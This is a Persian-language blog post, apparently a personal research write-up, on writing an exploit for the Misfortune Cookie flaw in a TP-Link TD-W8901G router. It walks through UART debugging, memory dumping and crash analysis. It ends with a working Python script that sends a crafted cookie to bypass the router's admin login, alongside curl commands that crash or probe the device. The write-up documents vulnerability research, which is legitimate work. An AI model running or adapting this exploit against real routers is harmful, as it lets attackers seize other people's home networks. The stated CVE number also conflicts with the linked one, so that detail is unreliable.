<!DOCTYPE html>
<html>

  <head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">

<title>کوکی بدبختی مودم ها! - بلاگ - میلاد دورباش</title>
<meta name="description" content="حدودا یک ماه پیش یه نفر اومد پیش من و بهم گفت مودمش هک شده و پسورد وای فای عوض شده.خب ذهن من رفت سمت هک وای فای گفتم حتما پسورد وای فای ساده بوده.ولی اون ادامه داد پسورد وای فای و ادمین کانفیگ خیلی پیچیده بود.ازش پرسیدم WPS مودمش خاموش بوده گفت آره.این باعث شد من به فکر فرو برم.یعنی هکر از چه راهی وارد شده؟
با یکم سرچ متوجه شدم تو یه سری از مدل های مودم یه باگ وجود داره به اسم Misfortune Cookie  یا CVE-2015-9222  که به نفوذگر اجازه میده با ارسال کوکی دستکاری شده محتوای مموری مودم رو تغییر بده و احرازهویت رو دور بزنه!"/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="https://doorbash.github.io/blog/posts/%DA%A9%D9%88%DA%A9%DB%8C_%D8%A8%D8%AF%D8%A8%D8%AE%D8%AA%DB%8C_%D9%85%D9%88%D8%AF%D9%85_%D9%87%D8%A7/" />


<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="حدودا یک ماه پیش یه نفر اومد پیش من و بهم گفت مودمش هک شده و پسورد وای فای عوض شده.خب ذهن من رفت سمت هک وای فای گفتم حتما پسورد وای فای ساده بوده.ولی اون ادامه داد پسورد وای فای و ادمین کانفیگ خیلی پیچیده بود.ازش پرسیدم WPS مودمش خاموش بوده گفت آره.این باعث شد من به فکر فرو برم.یعنی هکر از چه راهی وارد شده؟
با یکم سرچ متوجه شدم تو یه سری از مدل های مودم یه باگ وجود داره به اسم Misfortune Cookie  یا CVE-2015-9222  که به نفوذگر اجازه میده با ارسال کوکی دستکاری شده محتوای مموری مودم رو تغییر بده و احرازهویت رو دور بزنه!" />
<meta name="twitter:title" content="کوکی بدبختی مودم ها! - بلاگ - میلاد دورباش" />
<meta name="twitter:site" content="https://twitter.com/doorbash" />
<meta name="twitter:creator" content="https://twitter.com/doorbash" />


<meta property="og:type" content="article" />
<meta content="کوکی بدبختی مودم ها! - بلاگ - میلاد دورباش" property="og:title">
<meta content="حدودا یک ماه پیش یه نفر اومد پیش من و بهم گفت مودمش هک شده و پسورد وای فای عوض شده.خب ذهن من رفت سمت هک وای فای گفتم حتما پسورد وای فای ساده بوده.ولی اون ادامه داد پسورد وای فای و ادمین کانفیگ خیلی پیچیده بود.ازش پرسیدم WPS مودمش خاموش بوده گفت آره.این باعث شد من به فکر فرو برم.یعنی هکر از چه راهی وارد شده؟
با یکم سرچ متوجه شدم تو یه سری از مدل های مودم یه باگ وجود داره به اسم Misfortune Cookie  یا CVE-2015-9222  که به نفوذگر اجازه میده با ارسال کوکی دستکاری شده محتوای مموری مودم رو تغییر بده و احرازهویت رو دور بزنه!" property="og:description">
<meta property="og:url" content="https://doorbash.github.io/blog/posts/%DA%A9%D9%88%DA%A9%DB%8C_%D8%A8%D8%AF%D8%A8%D8%AE%D8%AA%DB%8C_%D9%85%D9%88%D8%AF%D9%85_%D9%87%D8%A7/" />
<meta property="og:site_name" content="بلاگ - میلاد دورباش" />

<meta property="article:published_time" content="2016-04-27 00:00:00 &#43;0000 UTC" />





<script type="application/ld+json">
{ 
    "@context": "http://schema.org", 
    "@type": "BlogPosting",
    "headline": "کوکی بدبختی مودم ها!",
    "genre": "",  
    "url": "https:\/\/doorbash.github.io\/blog\/posts\/%DA%A9%D9%88%DA%A9%DB%8C_%D8%A8%D8%AF%D8%A8%D8%AE%D8%AA%DB%8C_%D9%85%D9%88%D8%AF%D9%85_%D9%87%D8%A7\/",
    "datePublished": "2016-04-27 00:00:00 \u002b0000 UTC",
    "description": "حدودا یک ماه پیش یه نفر اومد پیش من و بهم گفت مودمش هک شده و پسورد وای فای عوض شده.خب ذهن من رفت سمت هک وای فای گفتم حتما پسورد وای فای ساده بوده.ولی اون ادامه داد پسورد وای فای و ادمین کانفیگ خیلی پیچیده بود.ازش پرسیدم WPS مودمش خاموش بوده گفت آره.این باعث شد من به فکر فرو برم.یعنی هکر از چه راهی وارد شده؟\nبا یکم سرچ متوجه شدم تو یه سری از مدل های مودم یه باگ وجود داره به اسم Misfortune Cookie  یا CVE-2015-9222  که به نفوذگر اجازه میده با ارسال کوکی دستکاری شده محتوای مموری مودم رو تغییر بده و احرازهویت رو دور بزنه!",
    "author": {
        "@type": "Person",
        "name": ""
    }
 }
</script>




<link rel="stylesheet" href="/blog/sass/main.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
</head>


  <body>

    <header class="site-header">
<nav class="navbar navbar-default">
  <div class="container-fluid">
    
    <div class="navbar-header">
      <a class="navbar-brand" href="https://doorbash.github.io/blog/">بلاگ - میلاد دورباش</a>
    </div>
  </div>
</nav>
</header>


    <div class="container">
      <div class="wrapper">
        
<div class="row">

<div class="col-md-4 mt20">
        <div class="post-img">
           
            <img width="600" src="https://doorbash.github.io/blog/images/misfortune_cookie.png" alt="کوکی بدبختی مودم ها!">
            
        </div>
            
        
        <div class="mt10 recent">
            <h3 class="mb16">نوشته‌های اخیر</h3>        
             <ul>
                

                      <li>
                      <p><small>June 22, 2020&nbsp;&nbsp;</small><a href="https://doorbash.github.io/blog/posts/%D8%A8%D8%B1%D8%B1%D8%B3%DB%8C_%D8%AA%D8%B1%D8%A7%D9%81%DB%8C%DA%A9_%D8%B4%D8%A8%DA%A9%D9%87_%D8%AA%D9%88%D8%B3%D8%B7_arp_spoofing/">بررسی ترافیک شبکه توسط arp spoofing</a></p>
                      </li>

                

                      <li>
                      <p><small>September 18, 2019&nbsp;&nbsp;</small><a href="https://doorbash.github.io/blog/posts/%D8%A8%D8%A7%D8%B2%DB%8C_%D9%87%D8%A7%DB%8C_%D9%81%D9%84%D8%B4_%D9%82%D8%AF%DB%8C%D9%85%DB%8C/">بازی های فلش قدیمی من</a></p>
                      </li>

                

                      <li>
                      <p><small>August 1, 2019&nbsp;&nbsp;</small><a href="https://doorbash.github.io/blog/posts/%D8%AA%D9%84%DA%AF%D8%B1%D8%A7%D9%85_%D8%A7%D8%B3%D8%AA%DB%8C%DA%A9%D8%B1_%DA%AF%DB%8C%D9%81_%D9%85%D9%85%D9%86%D9%88%D8%B9/">تلگرام: استیکر و گیف ممنوع!</a></p>
                      </li>

                
              </ul>
        </div>
        
        <br>

</div>

<div class="col-md-8">
    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">

          <header class="post-header">
            <h1 class="post-title" itemprop="name headline">کوکی بدبختی مودم ها!</h1>
            <p class="post-meta"><time datetime='2016-04-27T00:00:00Z' itemprop="datePublished">April 27, 2016</time></p>
                 
          </header>

          <div class="post-content" itemprop="articleBody">
            <p>حدودا یک ماه پیش یه نفر اومد پیش من و بهم گفت مودمش هک شده و پسورد وای فای عوض شده.خب ذهن من رفت سمت هک وای فای گفتم حتما پسورد وای فای ساده بوده.ولی اون ادامه داد پسورد وای فای و ادمین کانفیگ خیلی پیچیده بود.ازش پرسیدم WPS مودمش خاموش بوده گفت آره.این باعث شد من به فکر فرو برم.یعنی هکر از چه راهی وارد شده؟</p>
<p>با یکم سرچ متوجه شدم تو یه سری از مدل های مودم یه باگ وجود داره به اسم <a href="http://mis.fortunecook.ie" target="_blank"> Misfortune Cookie </a> یا <a href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9222" target="_blank"> CVE-2015-9222 </a> که به نفوذگر اجازه میده با ارسال کوکی دستکاری شده محتوای مموری مودم رو تغییر بده و احرازهویت رو دور بزنه!</p>
<p><a href="http://www.checkpoint.com/" target="_blank"> چک پوینت </a> نام شرکتیه که این آسیب پذیری رو پیدا کرده.اون ها اسلایدهاشون در رابطه با این باگ و دو آسیب پذیری دیگه رو در <a href="http://mis.fortunecook.ie/too-many-cooks-exploiting-tr069_tal-oppenheim_31c3.pdf" target="_blank"> یک فایل  پی دی اف </a> منتشر کردن.</p>
<p>چک پوینت تو قسمت سوال و جواب اسلایدها نوشته اکسپلویت این باگ رو به کسی نمیده.سرچ کردم تا ببینم اکسپلویتی برای این باگ پیدا میکنم یا نه.فکر کردم اگه هکر یه اسکریپت کیدی باشه حتما اکسپلویت رو از <a href="https://www.exploit-db.com/" target="_blank"> اکسپلویت دیبی </a> یا جای دیگه برداشته ولی اینطور نبود.هیچ جای اینترنت اکسپلویتی برای این باگ نبود! برام عجیب بود این باگ بیشتر از یک ساله که پیدا شده ولی هیچ اکسپلویتی براش نیست!</p>
<p>تو وبسایتی که برای این باگ ساختن نوشته شده روی 12 میلیون دستگاه از 189 کشور این باگ وجود داره و فهمیدنش هم با استفاده <a href="https://www.shodan.io/" target="_blank"> Shodan </a> نباید کار سختی باشه.</p>
<p>و خب این برام واضح بود که چطور بعد از گذشت یک سال و خورده ای صاحبان این دستگاه ها فیرمور های مودمشون رو به جدیدترین نسخه آپدیت نکردن تا این آسیب پذیری رفع بشه.دلیلش اینه که تا قبل از این داستان ها حتی خود من هم نمی دونستم چطور باید فیرمور مودم رو آپدیت کرد! و حتی اهمیتی هم به این مساله نمی دادم.</p>
<p>بگذریم.در نهایت این واقعیت که یک سوراخ بزرگ امنیتی در اینترنت وجود داره به من انگیزه داد برای کار روی کوکی بدبختی!</p>
<p>تو فایل اسلایدها نوشته با استفاده از UART مودم رو به کامپیوتر وصل کردن و محتوای مموری رو دیدند.من یک مودم TP Link اضافه از نوع TD-W8901G خونه دارم.</p>
<p>اول باید مطمئن می شدم آسیب پذیره.چک پوینت لیست دستگاه های آسیب پذیر رو اینجا نوشته مدل دستگاه من هم توش هست.برای تست آسیب پذیری <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/http/allegro_rompager_misfortune_cookie.rb" target="_blank"> یک ماژول متااسپلویت </a> هم وجود داره که روش کار تشخیصش بر اساس یه کوکی خاص هست که تو صفحه ۳۶ فایل اسلاید ها به عنوان poc یا proof-of-concept قرار داده شده:</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Bash" data-lang="Bash"><span style="color:#008080">C107373883</span><span style="color:#000;font-weight:bold">=</span>/hello
</code></pre></div><p>با ارسال این کوکی برای مودم به این صورت:</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Bash" data-lang="Bash">curl --header <span style="color:#d14">&#39;Cookie: C107373883=/hello&#39;</span> 192.168.1.1
</code></pre></div><p>مودم خروجی زیر رو میده:</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#000080">html</span>&gt;
&lt;<span style="color:#000080">head</span>&gt;
&lt;<span style="color:#000080">title</span>&gt;Object Not Found&lt;/<span style="color:#000080">title</span>&gt;&lt;/<span style="color:#000080">head</span>&gt;&lt;<span style="color:#000080">body</span>&gt;


&lt;<span style="color:#000080">h1</span>&gt;Object Not Found&lt;/<span style="color:#000080">h1</span>&gt;
</code></pre></div><p>همین طور که مشخه مودم می خواسته صفحه hello رو برگردونه اونم در حالی که قرار نبوده چنین کاری بکنه! این نشون می ده این کوکی داره قسمتی از مموری که آدرسی که باید لود بشه رو مشخص می کنه رو مقداردهی می کنه!</p>
<p>حالا که فهمیدم مودم آسیب پذیره برش داشتم و دو تا پیچ زیرش رو باز کردم و بورد اصلی رو بیرون آوردم.</p>
<p>با سرچ فهمیدم یه نفر به اسم PiotrBania تو یه مطلب از بلاگش سعی کرده یه باگ دیگه به اسم rom-0 رو تو مودم خودش رفع کنه.تو پرانتز بگم این باگ رو مودم من هم داره و تو یه مطلب جدا در موردش می نویسم ولی فعلا هدف میسفورچون کوکیه.</p>
<p>یه مبدل USB به RS232 هم خونه داشتم.پس چهار تا سیم برداشتم و به پایه های VCC GND RX TX مودم لحیم کردم.</p>
<p>سیم ها رو به مبدل و مبدل رو به USB وصل کردم و تو کامپیوتر minicom رو اجرا کردم و تنظیماتی که Piotr گفته یعنی 115200 باودریت و 8N1 رو ست کردم (minicom به صورت پیشفرض همین تنظیمات رو داره و نیازی به تغییر چیزی نیست.من این رو اول نمی دونستم).</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Bash" data-lang="Bash">minicom -D /dev/ttyUSB0
</code></pre></div><p>وقتی مودم روشن کردم خروجی روی صفحه نمایش داده شد:</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">Welcome to minicom 2.7

OPTIONS: I18n 
Compiled on Nov 30 2015, 11:52:37.
Port /dev/ttyUSB0, 17:05:37

Press CTRL-A Z for help on special keys



Bootbase Version: VTC_SPI1.11 | 2010/07/22 09:10:30
RAM: Size = 8192 Kbytes
DRAM POST: Testing:  8192K
OK
Found SPI Flash 2MiB Winbond W25Q16 at 0xbfc00000
SPI Flash Quad Enable
Turn off Quad Mode

RAS Version: 3.0.0 Build 140512 Rel.06002  
System   ID: $2.12.15.1(L03.YZ.3)3.11.2.175| 2014/04/30   20140430_v003  | 2014/04/30  

Press any key to enter debug mode within 3 seconds.
............................................................
Flash data is the same!!
Copyright (c) 2001 - 2006 TP-LINK TECHNOLOGIES CO., LTD
initialize ch = 0, IP175C, ethernet address: 54:e6:fc:f7:d9:f4
initialize ch = 1, ethernet address: 54:e6:fc:f7:d9:f4

auto channel OK!Wan Channel init ........ done
Initializing ADSL F/W ........ done 

==&amp;&gt;natTableMemoryInit
&amp;lt;==natTableMemoryInitANNEXAIJLM
US bitswap on,DS bitswap on
Valid OlrON
Valid SRAON
dhcp address probe action is disabled

Erasing 4K Sector...

Erasing 4K Sector...

writeRomBlock(): Erase OK!
portreverse : on 

set try multimode number to 3 (dropmode try num 3)
disable PM!
input line: sysValid largeD flag=2 (0:maxD=64, 1:maxD=128, 2:maxD=511)
Dyingasp OFF!
Valid Loss of power OFF!
Name Checking for Firmware Upgrade is OFF
Syncookie switch On!
Press ENTER to continue...
</code></pre></div><p>ولی یه مشکل بزرگ وجود داشت.مودم ورودی نمیگرفت.یعنی جایی که می نویسه Press any key یا Press enter to continue وقتی میزدم هیچ اتفاقی نمی افتاد.طی ۱۴ روز هرکاری که به ذهنم می رسید از تست کردن دو مودم دیگه و عوض کردن مبدل و گذاشتن مقاومت بین VCC و TX یا بین RX و GND تا پیام دادن تو توییتر به Piotr و زیرو کردن اینترنت انجام دادم ولی فایده نداشت.تا اینکه یه شب به ذهنم رسید شاید باید از آی سی MAX232 استفاده کنم چون دانشگاه درس آزمایشگاه ریزپردازنده ازش برای ارتباط USART بین میکرو و کامپیوتر استفاده می کردیم.خب مدارش رو با نامیدی بستم:</p>
<p>و با مبدل به کامپیوتر وصل کردم و بالاخره کارافتاد! ولی این تازه اول راه نوشتن اکسپلویت برای میسفورچون کوکی بود.</p>
<p>قبل از شروع لازمه بگم اینکاری که من میخواستم انجام بدم قبلا توسط Cawan Chui و Grant Willcox برای دو مودم با برند TP-Link و به ترتیب مدل های TD-W8901N و TD-8817 انجام شده.اما من میخواستم این اکسپلویت رو برای همه برندها و مدل ها تعمیم بدم و کاری کنم روی همه مودم های آسیب پذیر کار کنه.</p>
<p>با وارد شدن به حالت دیباگ و نوشتن دستور ATHE لیست دستورات چاپ میشه.</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">AT          just answer OK
ATHE          print help
ATBAx         change baudrate. 1:38.4k, 2:19.2k, 3:9.6k 4:57.6k 5:115.2k
ATENx,(y)     set BootExtension Debug Flag (y=password)
ATSE          show the seed of password generator
ATTI(h,m,s)   change system time to hour:min:sec or show current time
ATDA(y,m,d)   change system date to year/month/day or show current date
ATDS          dump RAS stack
ATDT          dump Boot Module Common Area
ATDUx,y       dump memory contents from address x for length y
ATRBx         display the  8-bit value of address x
ATRWx         display the 16-bit value of address x
ATRLx         display the 32-bit value of address x
ATGO(x)       run program at addr x or boot router
ATGR          boot router
ATGT          run Hardware Test Program
ATRTw,x,y(,z) RAM test level w, from address x to y (z iterations)
ATSH          dump manufacturer related data in ROM
ATDOx,y       download from address x for length y to PC via XMODEM
ATTD          download router configuration to PC via XMODEM
ATUR          upload router firmware to flash ROM

&amp;lt; press any key to continue &amp;&gt;
ATLC          upload router configuration file to flash ROM
ATXSx         xmodem select: x=0: CRC mode(default); x=1: checksum mode
ATLD          Upload Configuration File and Default ROM File to Flash
ATCD          Convert Running ROM File to Default ROM File into Flash

OK
</code></pre></div><p>طبق گفته Cawan قسمت اصلی فیرمور مودم از آدرس 0x80020000 روی مموری ریخته میشه.اما تا قبل از اینکه یکبار بوت لودر اجرا نشه فیرمور روی مموری وجود نداره تا بشه از مموری خوندش.</p>
<p>و این رو هم بگم که با وارد شدن به بوت لودر دیگه امکان برگشت به حالت دیباگ وجود نداره.مگه اینکه مودم ریست بشه و محتوای مموری دست نخورده باقی بمونه.پس با اجرای دستور</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">ATGO
</code></pre></div><p>بوت لودر رو اجرا کردم و با فرستادن کوکی اشتباه باعث کرش دادن مودم شدم</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">curl --header &#39;Cookie: C;&#39; 192.168.1.1
</code></pre></div><p>مودم ریست میشه و دوباره به حالت دیباگ برمی گرده.بعد از اون با اجرای دستور زیر محتوای مموری رو روی هارد ریختم</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">ATDO 80000000, FF00000
</code></pre></div><p>کلیدهای Ctrl+A و بعدش R رو زدم xmodem رو انتخاب کردم و آدرس فایل رو دادم و شروع کرد به خوندن از مموری.خوندن از مموری حدود ده دقیقه طول می کشه.</p>
<p>وقتی تموم شد باید فایل رو دیس اسمبل می کردم.با ویرچوال باکس ویندوز XP رو اجرا کردم و روش IDA نصب کردم و باهاش فایل مموری رو اجرا کردم.</p>
<p>IDA همون اول از ما می خواد که نوع پردازنده رو انتخاب کنیم.نوع پردازنده رو با اجرای دستور زیر روی فایل دامپ شده مموری میشه فهمید:</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">binwalk --disasm --minsn=100 80000000
</code></pre></div><p>پس نوع پردازنده رو mipsb انتخاب کردم.(این رو از Piotr هم پرسیدم).</p>
<p>و آدرس بیس رو 0x80000000 دادم.</p>
<p>IDA اول کار شروع میکنه به آنالیز کردن فایل باینری.یکم باید اول بهش وقت داد تا این کار رو انجام بده.</p>
<p>کاری که قرار بود انجام بدم غیرفعال کردن احراز هویت در مودم بود.اگر بوت لودر رو اجرا کنید با اجرای دستور زیر میشه احراز هویت رو غیرفعال کرد.</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">TP-LINK&amp;&gt; sys pswauthen 0
Do not need password authentication for configuration!
</code></pre></div><p>پس در IDA کلیدهای Alt+T رو زدم و طبق گفته Cawan عبارت Do not need رو سرچ کردم.</p>
<p>و این جارو پیدا کرد:</p>
<p>مشخصه که بایتی از مموری که معلوم می کنه احراز هویت فعال باشه یا نه این جاست:</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">-0x7A5B($gp)
</code></pre></div><p>طبق گفته Cawan اگر کوکی Cxxx=yyy برای مودم ارسال بشه yyy در آدرسی از مموری که به xxx یه ریطی داره نوشته می شه.برای فهمیدن آدرس دقیق بولین احراز هویت تو مموری به مقدار رجیستر gp نیازه.رجیستر gp به وسط یه بلاک با سایز مشخص از قسمت data اشاره میکنه. و مقدارش همیشه ثابت هست.پس طبقه کاری که Grant کرده کوکی زیر رو برای مودم فرستادم و مودم کرش کرد.</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">curl --header &#39;Cookie: C101010101=hello;&#39; 192.168.1.1
</code></pre></div><p>بعد از اینکه مودم کرش میکنه دو چیز که ما بهش نیاز داریم رو چاپ می کنه.یکی مقدار رجیستر gp و دیگه Bad Virtual Address که حافظه ای از مموریه که می خواسته روی اون بنویسه و نتونسته.</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">Cookie = 101010101
Bad Virtual Address = 0x71147c44
$gp = 0x803D6D90
</code></pre></div><p>همچنین اگر عدد کوکی رو یکی زیاد کنیم و دوباره بفرستیم به این صورت میشه:</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">Cookie = 101010102
Bad Virtual Address = 0x71147c6c
$gp = 0x803D6D90
</code></pre></div><p>از مقدار رجیستر gp میشه آدرسی که بولین فعال/غیر فعال بودن احرازهویت رو  در حافظه پیدا کرد:</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">auth_address = -0x7A5B($gp) = $gp -0x7A5B = 0x803D6D90 -0x7A5B = 0x803CF335
</code></pre></div><p>با کمک گرفتن از ریاضیات میشه کوکی ای که باید فرستاده بشه تا احراز هویت منتفی بشه رو حساب کرد:</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">AuthAddress = (0x71147c6c - 0x71147c44) * Cookie + Offset =&gt; AuthAddress = 0x28 * Cookie + Offset
0x71147c44 = 0x28 * hex(101010101) + Offset =&gt; Offset = −0x7FBF3004 = twos_complement(0x7FBF3004) = 0x8040CFFC
=&gt; Cookie = (AuthAddress - 0x8040CFC) / 0x28
=&gt; Cookie = (0x803CF335 - (−7FBF3004)) / 0x28
=&gt; Cookie = 107367854.225
</code></pre></div><p>عدد کوکی پیدا شد.با ارسال کوکی 107367854 آدرس 0x803cf32c از مموری تغییر می کنه که 9 بایت از آدرس بولین احراز هویت  کمتره.پس باید جای این 9 بایت رو با کاراکترهای الکی پر کرد.</p>
<p>در نهایت این اسکریپت رو نوشتم:</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#000;font-weight:bold">import</span> <span style="color:#555">socket</span>
<span style="color:#000;font-weight:bold">import</span> <span style="color:#555">sys</span>

host <span style="color:#000;font-weight:bold">=</span> <span style="color:#0086b3">str</span>(sys<span style="color:#000;font-weight:bold">.</span>argv[<span style="color:#099">1</span>])

a <span style="color:#000;font-weight:bold">=</span> socket<span style="color:#000;font-weight:bold">.</span>socket()

<span style="color:#000;font-weight:bold">print</span> <span style="color:#d14">&#34;Connecting to: &#34;</span> <span style="color:#000;font-weight:bold">+</span> host <span style="color:#000;font-weight:bold">+</span> <span style="color:#d14">&#34;:&#34;</span> <span style="color:#000;font-weight:bold">+</span> <span style="color:#0086b3">str</span>(<span style="color:#099">80</span>)
a<span style="color:#000;font-weight:bold">.</span>connect((host,<span style="color:#099">80</span>))

a<span style="color:#000;font-weight:bold">.</span>send(<span style="color:#d14">&#34;GET / HTTP/1.0</span><span style="color:#d14">\n</span><span style="color:#d14">&#34;</span>)

a<span style="color:#000;font-weight:bold">.</span>send(<span style="color:#d14">&#34;Cookie: C107367854=&#34;</span> <span style="color:#000;font-weight:bold">+</span> <span style="color:#d14">&#34;B&#34;</span><span style="color:#000;font-weight:bold">*</span><span style="color:#099">9</span> <span style="color:#000;font-weight:bold">+</span> <span style="color:#d14">&#34;</span><span style="color:#d14">\x00</span><span style="color:#d14">;</span><span style="color:#d14">\r\n\r\n</span><span style="color:#d14">&#34;</span>)

<span style="color:#000;font-weight:bold">print</span> a<span style="color:#000;font-weight:bold">.</span>recv(<span style="color:#099">2048</span>)

a<span style="color:#000;font-weight:bold">.</span>close()

<span style="color:#000;font-weight:bold">print</span> <span style="color:#d14">&#34;Done...&#34;</span>
</code></pre></div><p>قبل از اجرای این اسکریپت اگر به صفحه اصلی مودم بریم از ما میخواد یوزر پسورد رو وارد کنیم.</p>
<p>و با اجرای اون به این صورت زیر:</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Bash" data-lang="Bash">python exploit.py 192.168.1.1
</code></pre></div><p>دیگه از ما یورز پسورد نمی خواد و  وارد شدیم!</p>
<p>اکسپلویت رو برای exploit-db فرستادم و ظرف یک روز تایید شد.</p>
<a href="https://www.exploit-db.com/exploits/39739" target="_blank"> لینک اکسپلویت در exploit-db </a>

          </div>

    </article>
    <div class="row">
        
         
<div id="disqus_thread"></div>
<script defer>
(function() {
    var d = document, s = d.createElement('script');
    s.src = '//doorbash-github-io.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

        
    </div>
</div>

</div>




      </div>
    </div>

    <footer>
    <div class="container">
        <div class="row p20">
            
                <div class="col-md-4 text-center mt25">All rights reserved by <a target="_blank" href="https://doorbash.github.io">میلاد دورباش</a></div>
            

            <div class="col-md-4 text-center mt25" >
                
                <a target="_blank" href="https://bool.netlify.com"><img src="https://img.shields.io/badge/Built%20by-bool-brightgreen.svg" alt="bool"></a>
                
            </div>
            <div class="col-md-4 text-center mt25">
               
                <a target="_blank" href="https://www.facebook.com/milad.doorbash"><li class="social facebook"><i class="fa fa-facebook-square"></i></li></a> 
                
               
               
                <a target="_blank" href="https://twitter.com/doorbash"><li class="social twitter"><i class="fa fa-twitter-square"></i></li></a>
                
               
                <a target="_blank" href="https://github.com/doorbash/blog.doorbash.ir"><li class="social github"><i class="fa fa-github-square"></i></li></a>
                
               
                <a target="_blank" href="mailto:milad.doorbash@gmail.com"><li class="social email"><i class="fa fa-envelope"></i></li></a>
                
            </div>

        </div> 
    </div>
</footer>
    

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
  <script src="https://doorbash.github.io/blog//js/bootstrap.min.js"></script>
   
     
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-128176167-2', 'auto');
  ga('send', 'pageview');
</script>
  
  </body>

</html>